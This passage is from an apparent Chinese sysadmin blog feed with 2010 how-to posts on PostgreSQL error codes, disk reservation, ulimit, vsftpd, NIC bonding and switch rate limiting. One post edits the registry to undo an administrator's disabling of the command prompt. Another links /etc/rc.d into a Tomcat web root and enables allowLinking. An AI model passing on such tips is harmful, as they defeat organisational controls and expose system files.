OBJECT</p><p>duplicate_object</p><p>42702</p><p>AMBIGUOUS COLUMN</p><p>ambiguous_column</p><p>42725</p><p>AMBIGUOUS FUNCTION</p><p>ambiguous_function</p><p>42P08</p><p>AMBIGUOUS PARAMETER</p><p>ambiguous_parameter</p><p>42P09</p><p>AMBIGUOUS ALIAS</p><p>ambiguous_alias</p><p>42P10</p><p>INVALID COLUMN REFERENCE</p><p>invalid_column_reference</p><p>42611</p><p>INVALID COLUMN DEFINITION</p><p>invalid_column_definition</p><p>42P11</p><p>INVALID CURSOR DEFINITION</p><p>invalid_cursor_definition</p><p>42P12</p><p>INVALID DATABASE DEFINITION</p><p>invalid_database_definition</p><p>42P13</p><p>INVALID FUNCTION DEFINITION</p><p>invalid_function_definition</p><p>42P14</p><p>INVALID PREPARED STATEMENT DEFINITION</p><p>invalid_prepared_statement_definition</p><p>42P15</p><p>INVALID SCHEMA DEFINITION</p><p>invalid_schema_definition</p><p>42P16</p><p>INVALID TABLE DEFINITION</p><p>invalid_table_definition</p><p>42P17</p><p>INVALID OBJECT DEFINITION</p><p>invalid_object_definition</p><p>Class 44 — WITH CHECK OPTION Violation</p><p>44000</p><p>WITH CHECK OPTION VIOLATION</p><p>with_check_option_violation</p><p>Class 53 — Insufficient Resources</p><p>53000</p><p>INSUFFICIENT RESOURCES</p><p>insufficient_resources</p><p>53100</p><p>DISK FULL</p><p>disk_full</p><p>53200</p><p>OUT OF MEMORY</p><p>out_of_memory</p><p>53300</p><p>TOO MANY CONNECTIONS</p><p>too_many_connections</p><p>Class 54 — Program Limit Exceeded</p><p>54000</p><p>PROGRAM LIMIT EXCEEDED</p><p>program_limit_exceeded</p><p>54001</p><p>STATEMENT TOO COMPLEX</p><p>statement_too_complex</p><p>54011</p><p>TOO MANY COLUMNS</p><p>too_many_columns</p><p>54023</p><p>TOO MANY ARGUMENTS</p><p>too_many_arguments</p><p>Class 55 — Object Not In Prerequisite State</p><p>55000</p><p>OBJECT NOT IN PREREQUISITE STATE</p><p>object_not_in_prerequisite_state</p><p>55006</p><p>OBJECT IN USE</p><p>object_in_use</p><p>55P02</p><p>CANT CHANGE RUNTIME PARAM</p><p>cant_change_runtime_param</p><p>55P03</p><p>LOCK NOT AVAILABLE</p><p>lock_not_available</p><p>Class 57 — Operator Intervention</p><p>57000</p><p>OPERATOR INTERVENTION</p><p>operator_intervention</p><p>57014</p><p>QUERY CANCELED</p><p>query_canceled&lt; /td&gt;</p><p>57P01</p><p>ADMIN SHUTDOWN</p><p>admin_shutdown</p><p>57P02</p><p>CRASH SHUTDOWN</p><p>crash_shutdown</p><p>57P03</p><p>CANNOT CONNECT NOW</p><p>cannot_connect_now</p><p>Class 58 — System Error (errors external to PostgreSQL itself)</p><p>58030</p><p>IO ERROR</p><p>io_error</p><p>58P01</p><p>UNDEFINED FILE</p><p>undefined_file</p><p>58P02</p><p>DUPLICATE FILE</p><p>duplicate_file</p><p>Class F0 — Configuration File Error</p><p>F0000</p><p>CONFIG FILE ERROR</p><p>config_file_error</p><p>F0001</p><p>LOCK FILE EXISTS</p><p>lock_file_exists</p><p>Class P0 — PL/pgSQL Error</p><p>P0000</p><p>PLPGSQL ERROR</p><p>plpgsql_error</p><p>P0001</p><p>RAISE EXCEPTION</p><p>raise_exception</p><p>P0002</p><p>NO DATA FOUND</p><p>no_data_found</p><p>P0003</p><p>TOO MANY ROWS</p><p>too_many_rows</p><p>Class XX — Internal Error</p><p>XX000</p><p>INTERNAL ERROR</p><p>internal_error</p><p>XX001</p><p>DATA CORRUPTED</p><p>data_corrupted</p><p>XX002</p><p>INDEX CORRUPTED</p><p>index_corrupted</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux下磁盘保留空间的调整，解决df看到的空间和实际磁盘大小不一致的问题</title>
      <link href="/2010/08/25/the-disk-retention-space-under-linux-adjusts-to-solve-the-problem-that-df-sees-space-and-actual-disk-size/"/>
      <url>/2010/08/25/the-disk-retention-space-under-linux-adjusts-to-solve-the-problem-that-df-sees-space-and-actual-disk-size/</url>
      <content type="html"><![CDATA[<p>linux的硬盘分区程序会自动为root或指定的用户保留一定的磁盘空间默认是<strong>5％</strong>，在较大的分区或是不重要的分区上这种设置会占据过多不必要的空间， 利用mke2fs的-m reserved-percentage选项可以调整这个设置来获得更多的磁盘空间且不影响性能。而在创建了文件系统之后，用户可以用tune2fs来修 改这个设置比如tune2fs -m 1 /dev/sda4 可以将保留的空间设置为1％  </p><p>看 mkfs.ext3 的man page，就可以知道原因了，其中有这么一句：<br>-m reserved-blocks-percentage<br>Specify the percentage of the filesystem blocks reserved for the<br>super-user.   This  avoids  fragmentation, and allows root-owned<br>daemons, such as syslogd(8), to continue to  function  correctly<br>after non-privileged processes are prevented from writing to the<br>filesystem.  The default percentage is 5%.  </p><p>也就是说，ext文件系统，包括ext2、ext3、ext4都会默认预留5%的磁盘空间，留给root用户维护系统或者记录系统关键日志的时候使用(比如磁盘使用空间已经100%的情况下的处理)，这也就是导致普通用户无法使用部分磁盘空间的原因了。  </p><p>如：  </p><p>$ df -hl /dev/sda6<br>Filesystem Size Used Avail Use% Mounted on<br>/dev/sda6 42G 34G 5.8G 86% /linux/sda6  </p><p>$ tune2fs -m 0 /dev/sda6<br>tune2fs 1.41.3 (12-Oct-2008)<br>Setting reserved blocks percentage to 0% (0 blocks)  </p><p>$ df -hl /dev/sda6<br>Filesystem Size Used Avail Use% Mounted on<br>/dev/sda6 42G 34G 7.9G 81% /linux/sda6  </p><p>另外一个具体操作过程如下，已经加了详细注释：  </p><p>–之前的保留区有 732463 块<br># tune2fs -l /dev/sda7 | grep “Reserved block count”<br>Reserved block count:     732463  </p><p>–已用空间+可用空间 和 总空间 相比，还少了近3个G<br># df<br>文件系统             1K-块      已用      可用 已用% 挂载点<br>/dev/sda7             57677500  47662588   7085060  88% /home  </p><p>–调整：<br># tune2fs -r 25600 /dev/sda7<br>tune2fs 1.41.9 (22-Aug-2009)<br>Setting reserved blocks count to 25600  </p><p>–再来看看空间<br># df<br>文件系统             1K-块      已用      可用 已用% 挂载点<br>/dev/sda7             57677500  47662584   9912516  83% /home  </p><p>–确认调整成功<br># sudo tune2fs -l /dev/sda7 | grep “Reserved block count”<br>Reserved block count:     25600  </p><p>多了3G多的空间。而且还不是直接完全去掉保留区块，也留了百多兆以防不时之需。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql 3306 端口 close_wait引起的原因分析</title>
      <link href="/2010/08/23/analysis-of-the-causes-caused-by-mysql-3306-port-close-wait/"/>
      <url>/2010/08/23/analysis-of-the-causes-caused-by-mysql-3306-port-close-wait/</url>
      <content type="html"><![CDATA[<p>  mysql 3306 端口 close_wait引起的原因分析<br>1.域名解析引起<br>解决方法，启动参数加入–skip-name-resolve<br>2.ipv6引起close_wait（这个是比较重要的）<br>关闭ipv6功能<br>从新启动mysql服务<br>3.由于应用连接数据库的wait_timeout和mysql数据库的参数wait_timeout不一致造成<br>修该my.cnf<br>wait_timeout=“3600”<br>3600和你的应用timeout时间一至</p><p>后来还发现一个问题，mysql前端使用了F5进行探测，探测方式为tcp,mysql把这一个tcp当成是数据库的连接，一直没有释放，后经商量后修改F5的探测方式 为ping就OK了</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>line-rate 命令的用法</title>
      <link href="/2010/08/21/line-rate-command-usage/"/>
      <url>/2010/08/21/line-rate-command-usage/</url>
      <content type="html"><![CDATA[<p>有不少人不习惯用 line-rate 限制速度，也许CISCO用习惯列表了吧。<br>那我就简单写下<br>报文速率限制级别取值为1～127。如果速率限制级别取值在1～28范围内，则速率限制的粒度为64Kbps，这种情况下，当设置的级别为N，则端口上限制的速率大小为N*64K；如果速率限制级别取值在29～127范围内，则速率限制的粒度为1Mbps，这种情况下，当设置的级别为N，则端口上限制的速率大小为(N-27)*1Mbps。  </p><p>配置示例:  </p><ol><li><p>进入端口E0/1的配置视图<br>[SwitchA]interface Ethernet 0/1  </p></li><li><p>对端口E0/1的出方向报文进行流量限速，限制到3Mbps<br>[SwitchA- Ethernet0/1]line-rate outbound 30  </p></li><li><p>对端口E0/1的入方向报文进行流量限速，限制到1Mbps<br>[SwitchA- Ethernet0/1]line-rate inbound 16</p></li></ol>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>交换机端口限速的配置方法（cisco3550/3560、cisco3750）</title>
      <link href="/2010/08/21/configuration-method-of-switch-port-speed-limit-cisco3550-3560-cisco3750/"/>
      <url>/2010/08/21/configuration-method-of-switch-port-speed-limit-cisco3550-3560-cisco3750/</url>
      <content type="html"><![CDATA[<p>1.对所有流量进行限制</p><p>mls qos<br>!<br>class-map match-all IPclass     //所有抓取所有流量<br>  match ip dscp 0<br>!<br>!<br>policy-map rate-256K<br>class IPclass<br>    police 256000 20000 exceed-action drop<br>policy-map rate-512K<br>class IPclass<br>    police 512000 20000 exceed-action drop<br>policy-map rate-2M<br>  class IPclass<br>    police 2096000 200000 exceed-action drop<br>policy-map rate-6M<br>  class IPclass<br>    police 6296000 600000 exceed-action drop<br>policy-map rate-4M<br>  class IPclass<br>    police 4200000 300000 exceed-action drop<br>policy-map rate-800M<br>  class IPclass<br>    police 800000000 800000 exceed-action drop  //定义policy-map，800M开始延时增加，到达800.8M后开始丢弃（丢包）<br>interface FastEthernet0/22<br>service-policy input rate-256K         //应用policy到交换机端口上<br>service-policy output rate-256K</p><p>2.对部分流量进行限制</p><p>一、需求</p><p>PC１接在Cisco3550 F0/1上，速率为1Ｍ；<br>PC2 接在Cisco3550 F0/2上，速率为2Ｍ；<br>Cisco3550的G0/1为出口。</p><p>二、详细配置过程<br>注：每个接口每个方向只支持一个策略；一个策略可以用于多个接口。因此所有PC的下载速率的限制都应该定义在同一个策略(在本例子当中<br>为policy</p><p>1、在交换机上启动QOS<br>Switch(config)#mls qos //在交换机上启动QOS</p><p>２、分别定义PC1(10.10.1.1)和PC2(10.10.2.1)访问控制列表<br>Switch(config)#access-list 10 permit 10.10.1.0 0.0.0.255 //控制pc1上行流量<br>Switch(config)#access-list 100 permit any 10.10.1.0 0.0.0.255 //控制pc1下行流量<br>Switch(config)#access-list 11 permit 10.10.2.0 0.0.0.255 //控制pc2上行流量<br>Switch(config)#access-list 111 permit any 10.10.2.0 0.0.0.255 //控制pc2下行流量</p><p>３、定义类，并和上面定义的访问控制列表绑定<br>Switch(config)# class-map user1-up //定义PC１上行的类，并绑定访问列表10<br>Switch(config-cmap)# match access-group 10<br>Switch(config-cmap)# exit<br>Switch(config)# class-map user2-up<br>Switch(config-cmap)# match access-group 11 //定义PC2上行的类，并绑定访问列表10<br>Switch(config-cmap)# exit<br>Switch(config)# class-map user1-down<br>Switch(config-cmap)# match access-group 100 //定义PC１下行的类，并绑定访问列表100<br>Switch(config-cmap)# exit<br>Switch(config)# class-map user2-down<br>Switch(config-cmap)# match access-group 111 //定义PC2下行的类，并绑定访问列表111<br>Switch(config-cmap)# exit</p><p>4、定义策略，把上面定义的类绑定到该策略<br>Switch(config)# policy-map user1-up //定义PC１上行的速率为1M<br>Switch(config-pmap)# class user1-up<br>Switch(config-pmap-c)# trust dscp<br>Switch(config-pmap-c)# police 1024000 1024000 exceed-action drop<br>Switch(config)# policy-map user2-up //定义PC２上行的速率为2M<br>Switch(config-pmap)# class user2-up<br>Switch(config-pmap-c)# trust dscp<br>Switch(config-pmap-c)# police 2048000 1024000 exceed-action drop<br>Switch(config)# policy-map user-down<br>Switch(config-pmap)# class user1-down<br>Switch(config-pmap-c)# trust dscp<br>Switch(config-pmap-c)# police 1024000 1024000 exceed-action drop<br>Switch(config-pmap-c)# exit<br>Switch(config-pmap)# class user2-down<br>Switch(config-pmap-c)# trust dscp<br>Switch(config-pmap-c)# police 2048000 1024000 exceed-action drop<br>Switch(config-pmap-c)# exit</p><p>５、在接口上运用策略<br>Switch(config)# interface f0/1<br>Switch(config-if)# service-policy input user1-up<br>Switch(config)# interface f0/2<br>Switch(config-if)# service-policy input user2-up<br>Switch(config)# interface g0/1<br>Switch(config-if)# service-policy input user-down</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CentOS ulimit系统命令修改</title>
      <link href="/2010/08/18/centos-ulimit-system-command-modification/"/>
      <url>/2010/08/18/centos-ulimit-system-command-modification/</url>
      <content type="html"><![CDATA[<p>在向大家详细介绍CentOS ulimit之前，首先让大家了解下CentOS ulimit，然后全面介绍CentOS ulimit，希望对大家有用。CentOS ulimit值(Linux文件句柄数量)在CentOS5(RHEL5)中的调整。</p><p>在Linux下面部署应用的时候，有时候会遇上Socket/File: Can’t open so many files的问题，比如还有Squid做代理,当文件打开数到900多时速能就非常快的下降，有可能打不开网页.<br>其实Linux是有文件句柄限制的，而且Linux默认不是很高，一般都是1024，生产服务器用其实很容易就达到这个数量.</p><p>查看方法<br>我们可以用CentOS ulimit -a来查看所有限制值<br>[root@centos5 ~]# Centos ulimit -a<br>core file size          (blocks, -c) 0<br>data seg size           (kbytes, -d) unlimited<br>max nice                        (-e) 0<br>file size               (blocks, -f) unlimited<br>pending signals                 (-i) 4096<br>max locked memory       (kbytes, -l) 32<br>max memory size         (kbytes, -m) unlimited<br>open files                      (-n) 1024<br>pipe size            (512 bytes, -p) 8<br>POSIX message queues     (bytes, -q) 819200<br>max rt priority                 (-r) 0<br>stack size              (kbytes, -s) 10240<br>cpu time               (seconds, -t) unlimited<br>max user processes              (-u) 4096<br>virtual memory          (kbytes, -v) unlimited<br>file locks                      (-x) unlimited||&lt;</p><p>其中 “open files (-n) 1024 “是Linux操作系统对一个进程打开的文件句柄数量的限制(也包含打开的SOCKET数量,可影响MySQL的并发连接数目).这个值可用CentOS ulimit命令来修改,但CentOS ulimit命令修改的数值只对当前登录用户的目前使用环境有效,系统重启或者用户退出后就会失效.<br>系统总限制是在这里，/proc/sys/fs/file-max.可以通过cat查看目前的值，修改/etc/sysctl.conf 中也可以控制.<br>另外还有一个，/proc/sys/fs/file-nr，可以看到整个系统目前使用的文件句柄数量<br>查找文件句柄问题的时候，还有一个很实用的程序lsof.可以很方便看到某个进程开了那些句柄.也可以看到某个文件/目录被什么进程占用了.</p><p>修改方法<br>若要令修改CentOS ulimits的数值永久生效,则必须修改配置文档,可以给CentOS ulimit修改命令放入/etc/profile里面，这个方法实在是不方便,还有一个方法是修改/etc/sysctl.conf .我修改了，测试过,但对用户的CentOS ulimits -a 是不会改变的。只是/proc/sys/fs/file-max的值变了.(我给命令放到rc.local中失败)</p><p>我认为正确的做法，应该是修改/etc/security/limits.conf<br>里面有很详细的注释，比如<br>* soft nofile 32768<br>* hard nofile 65536<br>也可以直接运行下面这个shell。直接copy到你的终端中运行就好了.<br>echo -ne “<br>* soft nofile 65536<br>* hard nofile 65536<br>“ &gt;&gt;/etc/security/limits.conf</p><p>就可以将文件句柄限制统一改成软32768，硬65536.配置文件最前面的是指domain，设置为星号代表全局，另外你也可以针对不同的用户做出不同的限制注意.这个当中的硬限制是实际的限制，而软限制，是warnning限制，只会做出warning.其实CentOS ulimit命令本身就有分软硬设置，加-H就是硬，加-S就是软默认显示的是软限制，如果运行CentOS ulimit命令修改的时候没有加上的话，就是两个参数一起改变.生效<br>修改完重新登录就可以见到.(我的系统是CentOS5.1.修改了，重新登录后就立刻生效.可以用CentOS ulimit -a 查看确认.)<br>如果你使用squid的话,你要在/etc/init.d/squid的文件加入CentOS ulimit -HSn 65535.另外,在squid.conf中也要加入max_filedesc 16384</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 密码生成</title>
      <link href="/2010/08/18/linux-password-generation/"/>
      <url>/2010/08/18/linux-password-generation/</url>
      <content type="html"><![CDATA[<p>关于动态密码的好处就不用多说了。  </p><p>我的系统的是rhel5  </p><p>安装软件包：<br>expect-5.43.0-5.1.i386.rpm        ## RHEL5自带有  </p><p>利用命令mkpasswd生成动态密码。</p><p>mkpasswd的用法：  </p><p>#mkpasswd 参数 用户名<br>-l 定义生成密码的长度，默认9<br>-d 定义密码里面包含数字个数，默认2<br>-c 定义包含小写字母个数，默认2<br>-C 定义包含大写字母个数，默认2<br>-s 定义包含特殊字符个数，默认1<br>-p 另外指定一个生成密码的程序，默认是/etc/yppasswd  </p><p>后面不带用户只是把生成的密码打印出来，如果后面带了用户，就会把用户的密码修改，并把密码打印出来。</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用DOS命令删除非空目录及子目录</title>
      <link href="/2010/08/17/delete-non-empty-directories-and-subdirectories-using-dos-commands/"/>
      <url>/2010/08/17/delete-non-empty-directories-and-subdirectories-using-dos-commands/</url>
      <content type="html"><![CDATA[<p>“rd 目录名 /s “<br>“rd /s 目录名”<br>此两种是删除前进行询问删除包括目标目录在内的所有内容  </p><p>“rd 目录名 /s /q “<br>“rd /s /q 目录名”<br>此两种是删除前不进行询问删除包括目标目录在内的所有内容</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>vim中空格和tab的替换</title>
      <link href="/2010/08/10/replace-the-whitespace-and-tab-in-vim/"/>
      <url>/2010/08/10/replace-the-whitespace-and-tab-in-vim/</url>
      <content type="html"><![CDATA[<p><strong>在.vimrc中添加以下代码后，重启vim即可实现按TAB产生4个空格：</strong></p><p>set ts=4  (注：ts是tabstop的缩写，设TAB宽4个空格)<br>set expandtab</p><p><strong>对于已保存的文件，可以使用下面的方法进行空格和TAB的替换：</strong></p><p><strong>TAB替换为空格：</strong><br>:set ts=4<br>:set expandtab<br>:%retab!</p><p><strong>空格替换为TAB：  </strong>:set ts=4<br>:set noexpandtab<br>:%retab!</p><p><strong>加!是用于处理非空白字符之后的TAB，即所有的TAB，若不加!，则只处理行首的TAB。</strong></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>晚走10分钟决定你的命运(转载)</title>
      <link href="/2010/08/06/10-minutes-late-to-decide-your-fate-reprint/"/>
      <url>/2010/08/06/10-minutes-late-to-decide-your-fate-reprint/</url>
      <content type="html"><![CDATA[<p>10分钟可以做什么，10分钟可以泡杯热茶，10分钟可以浏览一份报纸，10分钟可以浇几盆花，10分钟可以和同事简单的交谈……10分钟可以做很多事儿，甚至，每天晚走10分钟还能决定你的命运！  </p><p>每天晚走10分钟，从字面上理解，是每天下班之后，在办公室里多工作10分钟。然而，每天晚走10分钟，又远远超越了字面上的意义，而深藏着更多的启示着我们成功的黄金法则。  </p><p>每天晚走10分钟，是一种行动！每天晚走10分钟，是一种围绕着明确目标而进行的主动积极的行动！没有明确的目标，“每天晚走10分钟”对你而言只是一种消耗和煎熬；目标明确，它对你才有意义和价值。  </p><p>每天晚走10分钟，是一种价值！小时间往往能创造大价值。如何创造？每天晚走10分钟！每天晚走10分钟，即能脱颖而出；每天挤出一小时，即能成就大事；每周抽出一顿饭时间，即能扩大影响力。  </p><p>每天晚走10分钟，是一种勤奋！用发展的眼光深入解读，“每天晚走10分钟”有两层意思：一、成功没有捷径，惟有勤奋而已；二、付出超人的努力，才有超人的成就。  </p><p>每天晚走10分钟，是一种积累！要成功，必须从一点一滴的努力开始。只有不断的努力、踏踏实实的付出，才能凝聚起你爆发的力量！积累足够之时，成功水到渠成！  </p><p>每天晚走10分钟，是一种渐进！在工作上每天多付出一点点，在正确的事情上每天多做一点点，你会离事业上的更高一层越发接近。终有一天你会发现，自己已站在了事业的最高处。  </p><p>每天晚走10分钟，是一种习惯！任何较大的成功，都是好习惯的产物。当你把每天的付出养成为一个好习惯后，成功就会降临到你的头上。  </p><p>每天晚走10分钟，是一种责任！你一定要使自己成为一个值得信赖的人。这是老板的期望，同事们的期望，更是你的前途对你的期望！要值得信赖，主动担当责任是关键。  </p><p>每天晚走10分钟，是一种效能！效能，是指做正确的事。每个小时，每10分钟，每1分钟，甚至每1秒钟都很重要。把时间尽可能用在做正确的事上面，才会带来高效能。  </p><p>每天晚走10分钟，是一种卓越！只有卓越的人，才是不可替代的人。卓越者明白：该走的路都走过了，才能到达终点；该做的事都做好了，才能使事情圆满；该付出的都付出了，才能收获最高品质的果实。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>cmd里面出现命令提示符被停用</title>
      <link href="/2010/08/04/a-command-prompt-is-disabled-in-cmd/"/>
      <url>/2010/08/04/a-command-prompt-is-disabled-in-cmd/</url>
      <content type="html"><![CDATA[<p>今天公司要求加入域，可以加入后域管理可以随时登陆到我的机器，所以做一些加密文件处理，不小心搞cmd都用不了。</p><p>我在命令行输入CMD后，弹出窗口了，说命令提示符已被管理员停用？按任意键继续。。</p><p>可能是被管理员设置了禁用命令提示符窗口导致的这种现象。可以在注册表中将其重新启动，依次单击“开始\运行”命令，然后在打开的“运行”对话框中输入“regedit”，打开“注册表编辑器”窗口，并定位到HKEY_CURRECT _USER\Software\Policies\Microsoft\Windows\ system，接着在右侧窗口找到DisableCMD并双击将其值修改为0或者直接删除该键值即可，关闭“注册表编辑器”窗口，回到系统中就可以打开命令提示符窗口了。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux 查看目录大小及文件数量命令</title>
      <link href="/2010/07/29/linux-view-directory-size-and-file-number-commands/"/>
      <url>/2010/07/29/linux-view-directory-size-and-file-number-commands/</url>
      <content type="html"><![CDATA[<p>当文件数量太多，想知道文件总数，用ls|wc -l命令会使服务器负载升高。可以参考如下命令，</p><p>查看当前目录大小：</p><p>[<a href="mailto:root@21andy.com" target="_blank" rel="noopener">root@21andy.com</a>]# du -sh  </p><p>查看指定目录大小：</p><p>[<a href="mailto:root@21andy.com" target="_blank" rel="noopener">root@21andy.com</a>]# du -sh /www/21andy.com  </p><p>查看当前目录文件总数：</p><p>[<a href="mailto:root@21andy.com" target="_blank" rel="noopener">root@21andy.com</a>]# find . -type f |wc -l  </p><p>查看指定目录文件总数：</p><p>[<a href="mailto:root@21andy.com" target="_blank" rel="noopener">root@21andy.com</a>]# find /www/21andy.com -type f |wc -l  </p><p>查看当前目录的目录总数：</p><p>[<a href="mailto:root@21andy.com" target="_blank" rel="noopener">root@21andy.com</a>]# find . -type d |wc -l  </p><p>查看指定目录的目录总数：</p><p>[<a href="mailto:root@21andy.com" target="_blank" rel="noopener">root@21andy.com</a>]# find /www/21andy.com -type d |wc -l</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>vsftp虚拟用户进不同目录</title>
      <link href="/2010/07/29/vsftp-virtual-users-enter-different-directories/"/>
      <url>/2010/07/29/vsftp-virtual-users-enter-different-directories/</url>
      <content type="html"><![CDATA[<p>今天业务需求要开FTP服务，三个不同的用户，登陆后进不同的目录，记录一下：</p><p><strong>1.创建虚拟用户数据库，首先创建一个文本文件</strong></p><p><strong>vim /etc/vsftpd/user.txt</strong></p><p>app</p><p>apptest</p><p>list</p><p>listtest</p><p>resource</p><p>resourcetest</p><p>2.生成数据库</p><p>db_load -T -t hash -f /etc/vsftpd/user.txt /etc/vsftpd/vsftpd_user.db</p><p>3.修改数据库权限</p><p>chmod 600 /etc/vsftpd/vsftpd_user</p><p>4.修改pam认证</p><p>vim /etc/pam.d/vsftpd</p><p>注释掉现有的所有配置，添加如下：<br>auth        required     /lib/security/pam_userdb.so    db=/etc/vsftpd/vsftpd_user<br>account     required     /lib/security/pam_userdb.so    db=/etc/vsftpd/vsftpd_user</p><p>5.新建虚拟用户</p><p>useradd -d /app/app -M -g test app</p><p>useradd -d /app/list -M -g test list</p><p>useradd -d /app/resource -g test resource</p><p>6.修改vsftpd.conf配置</p><p><strong>anonymous_enable=NO<br>local_enable=YES<br>**</strong>chroot_local_user=YES<br>user_config_dir=/etc/vsftpd/vsftpd_user_conf<br><strong>**pam_service_name=vsftpd</strong></p><p><strong>7.建立mkdir vsftpd_user_conf目录</strong></p><p><strong>vim app</strong></p><p>guest_enable=yes<br>guest_username=app<br>local_root=/app/app</p><p>vim list</p><p>guest_enable=yes<br>guest_username=list<br>local_root=/app/list</p><p>vim resource</p><p>guest_enable=yes<br>guest_username=list<br>local_root=/app/list</p><p>8.service vsftpd restart</p><p>chkconfig vsftpd on</p><p>9.注意iptables 防火墙要打开</p><p>10.运行db_load可能会没有这一个命令，就用yum install db4-utils,安装完就可以。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redhat Linux网卡配置与绑定</title>
      <link href="/2010/07/28/redhat-linux-network-card-configuration-and-binding/"/>
      <url>/2010/07/28/redhat-linux-network-card-configuration-and-binding/</url>
      <content type="html"><![CDATA[<p>Redhat Linux的网络配置，基本上是通过修改几个配置文件来实现的，虽然也可以用ifconfig来设置IP，用route来配置默认网关，用hostname来配置主机名，但是重启后会丢失。</p><p>相关的配置文件</p><p>/ect/hosts 配置主机名和IP地址的对应<br>/etc/sysconfig/network 配置主机名和网关<br>/etc/sysconfig/network-scripts/ifcfg-eth0 eth0配置文件，eth1则文件名为ifcfg-eth1，以此类推</p><p>一、网卡配置</p><p>假设我们要配置主机名为test，eth0的IP地址192.168.168.1/24，网关地址192.168.168.250</p><p>则/etc/sysconfig/network文件内容如下：</p><p>NETWORKING=yes<br>HOSTNAME=test<br>GATEWAY=192.168.168.250</p><p>eth0对应的配置文件/etc/sysconfig/network-scripts/ifcfg-eth0内容如下：</p><p>DEVICE=eth0<br>BOOTPROTO=static<br>IPADDR=192.168.168.1<br>NETMASK=255.255.255.0<br>TYPE=Ethernet<br>ONBOOT=yes</p><p>二、单网卡绑定多个IP</p><p>有时，我们需要在一块网卡上配置多个IP，例如，在上面的例子中，我们还需要为eth0配置IP 192.168.168.2和192.168.168.3。那么需要再在/etc/sysconfig/network-scripts下新建两个配置文件：</p><p>ifcfg-eth0:0内容如下：</p><p>DEVICE=eth0:0<br>BOOTPROTO=static<br>IPADDR=192.168.168.2<br>NETMASK=255.255.255.0<br>ONBOOT=yes</p><p>ifcfg-eth0:1内容如下：</p><p>DEVICE=eth0:1<br>BOOTPROTO=static<br>IPADDR=192.168.168.3<br>NETMASK=255.255.255.0<br>ONBOOT=yes</p><p>三、多个网卡绑定成一块虚拟网卡</p><p>为了提供网络的高可用性，我们可能需要将多块网卡绑定成一块虚拟网卡对外提供服务，这样即使其中的一块物理网卡出现故障，也不会导致连接中断。比如我们可以将eth0和eth1绑定成虚拟网卡bond0</p><p>首先在/etc/sysconfig/network-scripts/下创建虚拟网卡bond0的配置文件ifcfg-bond0，内容如下</p><p>DEVICE=bond0<br>BOOTPROTO=none<br>BROADCAST=192.168.168.255<br>IPADDR=192.168.168.1<br>NETMASK=255.255.255.0<br>NETWORK=192.168.168.0<br>ONBOOT=yes<br>TYPE=Ethernet<br>GATEWAY=192.168.168.250<br>USERCTL=no</p><p>然后分别修改eth0和eth1的配置文件<br>ifcfg-eth0内容：</p><p>DEVICE=eth0<br>BOOTPROTO=none<br>ONBOOT=yes<br>USERCTL=no<br>MASTER=bond0<br>SLAVE=yes</p><p>ifcfg-eth1内容</p><p>DEVICE=eth1<br>BOOTPROTO=none<br>ONBOOT=yes<br>USERCTL=no<br>MASTER=bond0<br>SLAVE=yes</p><p>因为linux的虚拟网卡是在内核模块中实现的，所以需要安装的时候已经装好该module。在/etc/modules.conf文件中添加如下内容（如果没有该文件，则新建一个）：</p><p>alias bond0 bonding<br>options bond0 miimon=100 mode=1 primary=eth0</p><p>其中miimon=100表示每100ms检查一次链路连接状态，如果不通则会切换物理网卡<br>mode=1表示主备模式，也就是只有一块网卡是active的，只提供失效保护。如果mode=0则是负载均衡模式的，所有的网卡都是active，还有其他一些模式很少用到<br>primary=eth0表示主备模式下eth0为默认的active网卡</p><p>最后，在/etc/rc.local中加入</p><p>modprobe bonding miimon=100 mode=1</p><p>重启机器后可以看到虚拟网卡已经生效，可以通过插拔两个物理网卡的网线来进行测试，不过linux中网卡接管的时间好象比较长</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>tomcat无法识别ROOT/ 下的软连接目录</title>
      <link href="/2010/07/26/tomcat-cannot-identify-the-root-lower-soft-connection-directory/"/>
      <url>/2010/07/26/tomcat-cannot-identify-the-root-lower-soft-connection-directory/</url>
      <content type="html"><![CDATA[<p><strong>症状：</strong></p><p>在 ROOT/ 下建立一个软连接文件<br>ln -s /etc/rc.d/ ./rc<br>再到rc软连接目录里建立个 aa.html<br>在访问这个aa.html时就出错。。  </p><p>HTTP Status 404 - rc /aa.html<br>--------------------------------------------------------------------------------  </p><p>type Status report  </p><p>message rc/aa.html  </p><p>description The requested resource (/aa.html) is not available.<br>--------------------------------------------------------------------------------  </p><p>Apache Tomcat/5.5.15  </p><p><strong>问题：</strong></p><p>tomcat把ln -s 建立的文件不认为是目录。。所以提示不存在<br>怎么办？</p><p><strong>解答：</strong></p><p>Tomcat 默认是不允许软连接的。在 <context>; 里面加上 allowLinking=”true” 属性就可以了。</context></p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>RHEL5.4和BCM5709网卡驱动问题</title>
      <link href="/2010/07/23/rhel5-4-and-bcm5709-network-card-drivers/"/>
